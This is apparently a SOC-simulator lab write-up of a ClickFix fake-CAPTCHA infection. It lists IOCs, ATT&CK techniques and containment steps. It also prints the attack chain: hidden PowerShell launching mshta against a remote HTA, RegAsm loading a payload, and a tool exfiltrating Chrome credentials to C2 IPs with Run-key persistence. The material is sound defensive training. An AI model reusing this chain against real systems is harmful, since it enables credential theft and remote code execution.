# ClickFix: The Fake CAPTCHA Trap

**Platform:** SOC Simulator | **Tools:** SIEM, XDR | **Duration:** ~20 min | **Verdict:** True Positive — 5/5 tasks, 70.83% accuracy

## Scenario

The ClickFix social-engineering technique uses a fake error/CAPTCHA dialog to trick a victim into copying, pasting and running malicious content themselves. Victim `anita.garcia` (host `corp-wks-102`, IP `10.0.1.135`) visited `eemmbryequo.shop`, was shown a "Verify You Are Human" check, and was instructed to press Win+R, paste, and hit Enter.

## Investigation and confirmed findings

| Step | Finding |
|---|---|
| Malicious DLL loaded | `Microsoft.Runtime.dll` — an attacker-chosen filename loaded by a living-off-the-land binary (`regasm.exe`) |
| Payload source IP | `185.91.69[.]119` (hosting `promptcraft.online`, the domain that served the downloaded payload) |
| C2 / exfiltration IP | `185.147.124[.]40` — reached via `cleanuploader.exe`, disguised behind a legitimate-looking TLS SNI |
| Full execution chain | `powershell.exe` (hidden, bypass policy) → `mshta.exe hxxps://eemmbryequo.shop/index.hta` → `RegAsm.exe /U ...\l6E.exe` → `cleanuploader.exe --target chrome --exfil c2-channel` |
| Persistence | Registry Run key confirmed — `cleanuploader.exe` set to relaunch on next logon |
| Containment decision | Isolate `corp-wks-102` from the network (XDR host isolation) |

## MITRE ATT&CK mapping

| Tactic | Technique |
|---|---|
| Initial Access / Execution | T1204.004 – User Execution: Malicious Copy and Paste |
| Execution | T1059.001 – Command and Scripting Interpreter: PowerShell |
| Defense Evasion | T1218.005 – System Binary Proxy Execution: Mshta; T1218.009 – System Binary Proxy Execution: Regsvcs/Regasm |
| Persistence | T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys |
| Collection / Credential Access | T1005 – Data from Local System; T1555 – Credentials from Password Stores (Chrome saved credentials) |

## Outcome

Closed as **True Positive**, 5/5 tasks. Containment executed: isolate the host via XDR, terminate `cleanuploader.exe`, remove the Run-key persistence entry, rotate credentials stored on the machine, and block `promptcraft.online`/`185.91.69.119` and `185.147.124.40` at the perimeter.

## Takeaway

ClickFix relies entirely on the user performing the "malicious" action themselves (copy, Win+R, paste, Enter) — no exploit is involved, which makes user-behavior telemetry (Run-dialog followed immediately by PowerShell spawn) a more reliable detection signal than trying to flag the lure page itself. The two chained LOLBins (`mshta.exe`, `regasm.exe`) are also a reminder that "signed Windows binary" is not synonymous with "safe" — the file it loads is an attacker-controlled claim, not a guarantee.
